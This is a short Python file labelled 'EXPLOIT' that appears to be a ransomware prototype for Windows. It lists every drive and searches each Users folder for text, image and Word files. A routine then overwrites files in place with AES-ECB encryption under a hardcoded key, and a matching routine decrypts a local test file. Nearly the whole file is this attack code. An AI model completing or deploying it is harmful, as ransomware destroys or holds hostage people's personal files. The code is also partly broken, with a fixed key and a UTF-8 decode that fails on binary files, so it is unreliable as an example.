#EXPLOIT
#HANDS
import os
import string
from ctypes import windll
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import random

def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives


def list_all_interisting_files(harddrive):
    #list all txt, png, docx in Users/
    #return list of files
    extensions = [".txt", ".png", ".docx"]
    # dirs = os.listdir("/Users/Wherxit/")
    # print(dirs)
    files_return = []
    #parse recursively all files in dirs
    path = os.path.join(harddrive, "Users")
    for root, dirs, files in os.walk(harddrive+"/Users/"):
        for file in files:
            for ext in extensions:
                if file.endswith(ext):
                    files_return.append(os.path.join(root, file))
    return files_return

def main():
    files=[]
    drives = get_drives()
    for drive in drives:
        drive= drive + ":"
        files.append(list_all_interisting_files(drive))
    print(files)

def random_char(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))
def generate_aes_key():
    #generate random string of 16
    key = random_char(16)
    print(key)
    print("abcdefghijklmnop".encode())
    return "abcdefghijklmnop".encode()

def encrypt_file(file_path, key):
    block_size = 32
    cipher= AES.new(key, AES.MODE_ECB)
    with open(file_path, "rb") as f:
        data = f.read()
        print(data)
    encrypted_data = cipher.encrypt(pad(data, block_size))
    with open(file_path, "wb") as f:
        f.write(encrypted_data)

def decrypt_file(file_path, key):
    block_size = 32
    cipher= AES.new(key, AES.MODE_ECB)
    with open(file_path, "rb") as f:
        data = f.read()
        print(data)
    decrypted_data = cipher.decrypt(data)
    data_dec= unpad(decrypted_data, block_size)
    print(data_dec)
    #dectrypted data to utf-8
    data_dec = data_dec.decode("utf-8")
    print(data_dec)
    with open(os.getcwd()+"/test/decrypted_salut.txt", "w+") as f:
        f.write(data_dec)

def test():
    print("test")
    key = generate_aes_key()
    print(key)
    encrypt_file(os.getcwd()+"/test/salut.txt", key)
    decrypt_file(os.getcwd()+"/test/salut.txt", key)

generate_aes_key()
